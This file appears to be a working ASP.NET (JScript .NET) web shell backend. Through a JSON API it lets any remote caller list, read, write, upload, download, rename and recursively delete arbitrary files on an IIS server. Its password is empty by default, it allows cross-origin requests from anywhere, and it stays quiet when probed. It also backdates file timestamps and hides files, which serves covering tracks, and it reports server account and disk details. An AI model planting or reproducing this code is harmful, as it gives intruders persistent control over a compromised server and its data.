<%@ Page Language="JScript" Debug="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%
Response.ContentType = "application/json";
Response.Charset = "utf-8";
Response.AddHeader("Access-Control-Allow-Origin", "*");
Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
Response.AddHeader("Access-Control-Allow-Headers", "Content-Type");

if (Request.HttpMethod == "OPTIONS") { Response.End(); }

var PASSWORD : String = "";
var password : String = Request.QueryString["password"] || Request.Form["password"] || "";
var action : String = Request.QueryString["action"] || Request.Form["action"] || "";

if (PASSWORD != "" && password != PASSWORD) { Response.Write("null"); Response.End(); }
if (action == "") { Response.ContentType = "text/html"; Response.End(); }

function getParam(name : String) : String {
    var v : String = Request.QueryString[name];
    if (v == null || v == "") v = Request.Form[name];
    return v || "";
}

function escStr(s : String) : String {
    if (s == null) return "";
    return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
}

function encodeValue(val : Object) : String {
    if (val == null) return "null";
    var t : String = val.GetType().Name;
    if (t == "Boolean") return val ? "true" : "false";
    if (t == "Int32" || t == "Int64" || t == "Double" || t == "Single" || t == "Decimal") return val.ToString();
    if (t == "String") return "\"" + escStr(val.ToString()) + "\"";
    if (t == "Hashtable") return toJson(Hashtable(val));
    if (t == "ArrayList") {
        var arr : ArrayList = ArrayList(val);
        var sb : System.Text.StringBuilder = new System.Text.StringBuilder();
        sb.Append("[");
        for (var i : int = 0; i < arr.Count; i++) {
            if (i > 0) sb.Append(",");
            sb.Append(encodeValue(arr[i]));
        }
        sb.Append("]");
        return sb.ToString();
    }
    return "\"" + escStr(val.ToString()) + "\"";
}

function toJson(ht : Hashtable) : String {
    var sb : System.Text.StringBuilder = new System.Text.StringBuilder();
    sb.Append("{");
    var first : boolean = true;
    var keys : IEnumerator = ht.Keys.GetEnumerator();
    while (keys.MoveNext()) {
        if (!first) sb.Append(",");
        first = false;
        sb.Append("\"" + escStr(keys.Current.ToString()) + "\":" + encodeValue(ht[keys.Current]));
    }
    sb.Append("}");
    return sb.ToString();
}

function ok(data : Hashtable) : Hashtable {
    var r : Hashtable = new Hashtable();
    r["success"] = true; r["data"] = data; r["message"] = "";
    return r;
}

function okMsg(msg : String) : Hashtable {
    var r : Hashtable = new Hashtable();
    r["success"] = true; r["message"] = msg;
    return r;
}

function fail(msg : String) : Hashtable {
    var r : Hashtable = new Hashtable();
    r["success"] = false; r["message"] = msg;
    return r;
}

function formatSize(size : long) : String {
    if (size < 1024) return size + " B";
    if (size < 1048576) return (size / 1024).toFixed(1) + " KB";
    if (size < 1073741824) return (size / 1048576).toFixed(1) + " MB";
    return (size / 1073741824).toFixed(1) + " GB";
}

function toUnixTime(dt : DateTime) : long {
    var epoch : DateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
    return Math.floor((dt.ToUniversalTime().Ticks - epoch.Ticks) / 10000000);
}

function normPath(p : String) : String {
    if (p == null || p == "" || p == "/") return Server.MapPath("/");
    return p.replace(/\//g, "\\");
}

function getPerms(attr : int, isDir : boolean) : String {
    var p : String = isDir ? "d" : "-";
    p += "r"; p += (attr & 1) ? "-" : "w"; p += isDir ? "x" : "-";
    p += "r-"; p += isDir ? "x" : "-"; p += "r-"; p += isDir ? "x" : "-";
    return p;
}

function makeItem(name : String, path : String, isDir : boolean, size : long, mtime : long, perms : String, writable : boolean) : Hashtable {
    var item : Hashtable = new Hashtable();
    item["name"] = name; item["path"] = path; item["is_dir"] = isDir;
    item["size"] = isDir ? 0 : size; item["size_formatted"] = isDir ? "-" : formatSize(size);
    item["mtime"] = mtime; item["perms"] = perms; item["readable"] = true; item["writable"] = writable;
    return item;
}

try {
    if (action == "list") {
        var listPath : String = normPath(getParam("path"));
        var dir : DirectoryInfo = new DirectoryInfo(listPath);
        if (dir.Exists) {
            var items : ArrayList = new ArrayList();
            if (dir.Parent != null) items.Add(makeItem("..", dir.Parent.FullName, true, 0, 0, "drwxr-xr-x", true));
            var dirs : DirectoryInfo[] = dir.GetDirectories();
            for (var i : int = 0; i < dirs.Length; i++) {
                try { items.Add(makeItem(dirs[i].Name, dirs[i].FullName, true, 0, toUnixTime(dirs[i].LastWriteTime), getPerms(int(dirs[i].Attributes), true), (int(dirs[i].Attributes) & 1) == 0)); } catch (ex : Exception) {}
            }
            var files : FileInfo[] = dir.GetFiles();
            for (var j : int = 0; j < files.Length; j++) {
                try { items.Add(makeItem(files[j].Name, files[j].FullName, false, files[j].Length, toUnixTime(files[j].LastWriteTime), getPerms(int(files[j].Attributes), false), !files[j].IsReadOnly)); } catch (ex : Exception) {}
            }
            var data : Hashtable = new Hashtable(); data["path"] = listPath; data["items"] = items;
            Response.Write(toJson(ok(data)));
        } else { Response.Write(toJson(fail("Directory not found"))); }
    }
    else if (action == "read") {
        var readPath : String = normPath(getParam("path"));
        if (File.Exists(readPath)) {
            var content : String = File.ReadAllText(readPath, System.Text.Encoding.UTF8);
            var data : Hashtable = new Hashtable(); data["path"] = readPath; data["content"] = content;
            Response.Write(toJson(ok(data)));
        } else { Response.Write(toJson(fail("File not found"))); }
    }
    else if (action == "write") {
        var writePath : String = getParam("path");
        var writeContent : String = Request.Form["content"] || "";
        if (writePath != "") {
            var parentDir : String = Path.GetDirectoryName(writePath);
            if (parentDir != "" && !Directory.Exists(parentDir)) { Response.Write(toJson(fail("Parent directory doesn't exist"))); }
            else {
                File.WriteAllText(writePath, writeContent, System.Text.Encoding.UTF8);
                Response.Write(toJson(okMsg("Saved to " + writePath)));
            }
        } else { Response.Write(toJson(fail("Path empty"))); }
    }
    else if (action == "mkdir") {
        var mkdirPath : String = getParam("path");
        if (mkdirPath != "") {
            if (!Directory.Exists(mkdirPath)) { Directory.CreateDirectory(mkdirPath); Response.Write(toJson(okMsg("Created"))); }
            else { Response.Write(toJson(fail("Already exists"))); }
        } else { Response.Write(toJson(fail("Path empty"))); }
    }
    else if (action == "delete") {
        var deletePath : String = normPath(getParam("path"));
        if (Directory.Exists(deletePath)) { Directory.Delete(deletePath, true); Response.Write(toJson(okMsg("Deleted"))); }
        else if (File.Exists(deletePath)) { File.Delete(deletePath); Response.Write(toJson(okMsg("Deleted"))); }
        else { Response.Write(toJson(fail("Not found"))); }
    }
    else if (action == "rename") {
        var oldPath : String = normPath(getParam("old_path"));
        var newPath : String = getParam("new_path");
        if (Directory.Exists(oldPath)) { Directory.Move(oldPath, newPath); Response.Write(toJson(okMsg("Renamed"))); }
        else if (File.Exists(oldPath)) { File.Move(oldPath, newPath); Response.Write(toJson(okMsg("Renamed"))); }
        else { Response.Write(toJson(fail("Not found"))); }
    }
    else if (action == "download") {
        var downloadPath : String = normPath(getParam("path"));
        if (File.Exists(downloadPath)) {
            Response.Clear(); Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(downloadPath) + "\"");
            Response.TransmitFile(downloadPath); Response.End();
        } else { Response.Write(toJson(fail("File not found"))); }
    }
    else if (action == "upload") {
        var uploadDir : String = getParam("dir"); if (uploadDir == "") uploadDir = Server.MapPath("/");
        uploadDir = normPath(uploadDir);
        if (Request.Files.Count > 0) {
            var uploadFile : HttpPostedFile = Request.Files[0];
            var uploadFilePath : String = Path.Combine(uploadDir, Path.GetFileName(uploadFile.FileName));
            uploadFile.SaveAs(uploadFilePath);
            var data : Hashtable = new Hashtable(); data["path"] = uploadFilePath;
            var r : Hashtable = new Hashtable(); r["success"] = true; r["message"] = "Uploaded"; r["data"] = data;
            Response.Write(toJson(r));
        } else { Response.Write(toJson(fail("No file"))); }
    }
    else if (action == "touch") {
        var touchPath : String = normPath(getParam("path"));
        var timestamp : long = 0; try { timestamp = parseInt(getParam("time")); } catch (e) {}
        if ((File.Exists(touchPath) || Directory.Exists(touchPath)) && timestamp > 0) {
            var newTime : DateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timestamp).ToLocalTime();
            if (File.Exists(touchPath)) File.SetLastWriteTime(touchPath, newTime);
            else Directory.SetLastWriteTime(touchPath, newTime);
            Response.Write(toJson(okMsg("Updated")));
        } else { Response.Write(toJson(fail("Not found or invalid time"))); }
    }
    else if (action == "chmod") {
        var chmodPath : String = normPath(getParam("path"));
        var mode : String = getParam("mode");
        if ((File.Exists(chmodPath) || Directory.Exists(chmodPath)) && mode != "") {
            if (File.Exists(chmodPath)) {
                var fi : FileInfo = new FileInfo(chmodPath);
                if (mode == "readonly") fi.Attributes = fi.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") fi.Attributes = fi.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") fi.Attributes = fi.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") fi.Attributes = fi.Attributes & ~FileAttributes.Hidden;
            } else {
                var di : DirectoryInfo = new DirectoryInfo(chmodPath);
                if (mode == "readonly") di.Attributes = di.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") di.Attributes = di.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") di.Attributes = di.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") di.Attributes = di.Attributes & ~FileAttributes.Hidden;
            }
            Response.Write(toJson(okMsg("Permission changed")));
        } else { Response.Write(toJson(fail("Not found or mode empty"))); }
    }
    else if (action == "server") {
        var docRoot : String = Server.MapPath("/");
        var diskFree : String = "N/A"; var diskTotal : String = "N/A";
        try { var drive : DriveInfo = new DriveInfo(Path.GetPathRoot(docRoot)); diskFree = formatSize(drive.AvailableFreeSpace); diskTotal = formatSize(drive.TotalSize); } catch (ex : Exception) {}
        var data : Hashtable = new Hashtable();
        data["php_version"] = "JScript .NET " + System.Environment.Version.ToString();
        data["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"] || "IIS";
        data["document_root"] = docRoot; data["upload_max"] = "N/A";
        data["disk_free"] = diskFree; data["disk_total"] = diskTotal;
        data["current_user"] = System.Environment.UserName || "N/A";
        Response.Write(toJson(ok(data)));
    }
    else if (action == "info") {
        var infoPath : String = normPath(getParam("path"));
        if (File.Exists(infoPath)) {
            var fi : FileInfo = new FileInfo(infoPath);
            var data : Hashtable = new Hashtable();
            data["path"] = infoPath; data["name"] = fi.Name; data["is_dir"] = false;
            data["size"] = int(fi.Length); data["size_formatted"] = formatSize(fi.Length);
            data["mtime"] = toUnixTime(fi.LastWriteTime); data["ctime"] = toUnixTime(fi.CreationTime); data["atime"] = toUnixTime(fi.LastAccessTime);
            data["perms"] = getPerms(int(fi.Attributes), false); data["perms_octal"] = "0644";
            data["owner"] = "N/A"; data["group"] = "N/A"; data["readable"] = true; data["writable"] = !fi.IsReadOnly;
            Response.Write(toJson(ok(data)));
        } else if (Directory.Exists(infoPath)) {
            var di : DirectoryInfo = new DirectoryInfo(infoPath);
            var data : Hashtable = new Hashtable();
            data["path"] = infoPath; data["name"] = di.Name; data["is_dir"] = true;
            data["size"] = 0; data["size_formatted"] = "-";
            data["mtime"] = toUnixTime(di.LastWriteTime); data["ctime"] = toUnixTime(di.CreationTime); data["atime"] = toUnixTime(di.LastAccessTime);
            data["perms"] = getPerms(int(di.Attributes), true); data["perms_octal"] = "0755";
            data["owner"] = "N/A"; data["group"] = "N/A"; data["readable"] = true; data["writable"] = (int(di.Attributes) & 1) == 0;
            Response.Write(toJson(ok(data)));
        } else { Response.Write(toJson(fail("Not found"))); }
    }
    else { Response.Write(toJson(fail("Unknown action"))); }
} catch (e : Exception) { Response.Write(toJson(fail("Error: " + e.Message))); }
%>
